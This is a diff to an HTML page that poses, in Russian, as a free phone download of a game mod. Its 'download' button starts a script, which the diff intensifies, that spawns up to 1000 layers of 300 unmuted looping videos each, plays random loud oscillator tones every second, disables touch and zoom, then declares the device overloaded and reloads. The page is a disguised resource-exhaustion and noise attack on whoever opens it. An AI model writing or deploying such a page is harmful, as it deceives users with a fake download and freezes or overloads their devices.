@@ -2,16 +2,28 @@
 <html>
 <head>
     <title>ДЖЕНИМОД СКАЧАТЬ НА ТЕЛЕФОН БЕЗ СМС И РЕГИСТРАЦИИ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        body { overflow: hidden; margin: 0; background: #000; }
+        body { 
+            overflow: hidden; 
+            margin: 0; 
+            background: #000; 
+            touch-action: none;
+        }
         .video-layer {
             position: absolute;
-            width: 20vw;
-            height: 20vh;
-            opacity: 0.8;
+            width: 30vw;
+            height: 30vh;
+            opacity: 0.9;
             pointer-events: none;
             transform: scale(0.8);
             filter: hue-rotate(90deg);
+            contain: strict;
+        }
+        .video-container {
+            position: absolute;
+            width: 100%;
+            height: 100%;
         }
         #audioTrigger {
             position: fixed;
@@ -20,26 +32,39 @@
             left: 10px;
             padding: 15px;
             font-size: 18px;
+            background: #ff00ff;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            text-shadow: 0 0 5px black;
         }
     </style>
 </head>
 <body>
     <button id="audioTrigger">СКАЧАТЬ</button>
     <script>
-        const MAX_LAYERS = 300; // Ограничение
-        const SPAWN_DELAY = 800; // Мс между созданиями
-        const VIDEO_SRC = "ambatublow.mp4"; 
+        const MAX_LAYERS = 1000; // Ограничение слоев
+        const VIDEOS_PER_LAYER = 300; // Видео в каждом слое
+        const SPAWN_DELAY = 500; // Мс между созданиями
+        const VIDEO_SOURCES = [
+            "ambatublow.mp4",
+            "Blue Lobster jumpscare 4k meme.mp4",
+            "Ima Tyre (Extended).mp4"
+        ];
+        
         let layerCount = 0;
         let audioEnabled = false;
         const audioContexts = [];
 
         document.getElementById('audioTrigger').addEventListener('click', function() {
             audioEnabled = true;
-            this.remove();
+            this.textContent = "ЗАГРУЗКА...";
+            this.disabled = true;
             createVideoLayer(); // Запуск процесса
         });
 
-        // Создание видео-слоя со звуком
+        // Создание видео-слоя с несколькими видео
         const createVideoLayer = () => {
             if (layerCount >= MAX_LAYERS || !audioEnabled) return;
             
@@ -49,46 +74,103 @@
             layer.style.top = Math.random() * 100 + 'vh';
             layer.style.transform += ` rotate(${Math.random() * 360}deg)`;
             
-            const video = document.createElement('video');
-            video.src = VIDEO_SRC + '?cachebust=' + Date.now() + layerCount;
-            video.autoplay = true;
-            video.loop = true;
-            video.playsInline = true;
-            video.volume = 1.0;
-            video.muted = false;
-            
-            
-            video.play().catch(e => {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                audioContexts.push(ctx);
-                const oscillator = ctx.createOscillator();
-                oscillator.connect(ctx.destination);
-                oscillator.start();
-            });
+            // Создаем несколько видео внутри слоя
+            for (let i = 0; i < VIDEOS_PER_LAYER; i++) {
+                const container = document.createElement('div');
+                container.className = 'video-container';
+                container.style.transform = `scale(${0.7 + Math.random() * 0.6}) rotate(${Math.random() * 45}deg)`;
+                container.style.opacity = 0.6 + Math.random() * 0.4;
+                
+                const video = document.createElement('video');
+                // Выбираем случайный источник видео
+                const videoSrc = VIDEO_SOURCES[Math.floor(Math.random() * VIDEO_SOURCES.length)];
+                video.src = videoSrc + '?cachebust=' + Date.now() + layerCount + i;
+                
+                video.autoplay = true;
+                video.loop = true;
+                video.playsInline = true;
+                video.volume = 1.0;
+                video.muted = false;
+                video.style.width = '100%';
+                video.style.height = '100%';
+                
+                // Оптимизация для мобильных
+                video.setAttribute('playsinline', '');
+                video.setAttribute('webkit-playsinline', '');
+                video.setAttribute('muted', 'false');
+                
+                video.play().catch(e => {
+                    // Fallback для iOS
+                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = ctx.createOscillator();
+                    oscillator.connect(ctx.destination);
+                    oscillator.start();
+                    audioContexts.push({ctx, oscillator});
+                });
 
-            layer.appendChild(video);
+                container.appendChild(video);
+                layer.appendChild(container);
+            }
+            
             document.body.appendChild(layer);
             layerCount++;
             
-            setTimeout(createVideoLayer, SPAWN_DELAY * (0.5 + Math.random()));
+            // Анимация движения слоев
+            animateLayer(layer);
+            
+            setTimeout(createVideoLayer, SPAWN_DELAY * (0.3 + Math.random()));
+        };
+
+        // Анимация движения слоев
+        const animateLayer = (layer) => {
+            let x = Math.random() * 2 - 1;
+            let y = Math.random() * 2 - 1;
+            
+            const move = () => {
+                const rect = layer.getBoundingClientRect();
+                if (rect.left < -50 || rect.left > window.innerWidth) x *= -1;
+                if (rect.top < -50 || rect.top > window.innerHeight) y *= -1;
+                
+                layer.style.left = (parseFloat(layer.style.left) + x) + 'vw';
+                layer.style.top = (parseFloat(layer.style.top) + y) + 'vh';
+                
+                requestAnimationFrame(move);
+            };
+            move();
         };
 
         // Дополнительная звуковая нагрузка
         setInterval(() => {
             if (!audioEnabled) return;
             
-            // Создаем фоновые аудио-потоки
             try {
                 const ctx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = ctx.createOscillator();
-                oscillator.type = 'sawtooth';
+                oscillator.type = ['sine', 'square', 'sawtooth'][Math.floor(Math.random() * 3)];
                 oscillator.frequency.setValueAtTime(100 + Math.random() * 2000, ctx.currentTime);
-                oscillator.connect(ctx.destination);
+                
+                const gain = ctx.createGain();
+                gain.gain.value = 0.5;
+                
+                oscillator.connect(gain);
+                gain.connect(ctx.destination);
                 oscillator.start();
-                setTimeout(() => oscillator.stop(), 5000);
+                
+                setTimeout(() => {
+                    oscillator.stop();
+                    try { ctx.close(); } catch(e) {}
+                }, 3000);
             } catch(e) {}
             
-        }, 3000);
+        }, 1000);
+        
+        // Автоматическое обновление страницы при перегрузке
+        setTimeout(() => {
+            if (audioEnabled) {
+                document.body.innerHTML = '<h1 style="color:red;text-align:center">УСТРОЙСТВО ПЕРЕГРУЖЕНО!</h1>';
+                setTimeout(() => location.reload(), 3000);
+            }
+        }, 30000);
     </script>
 </body>
 </html>
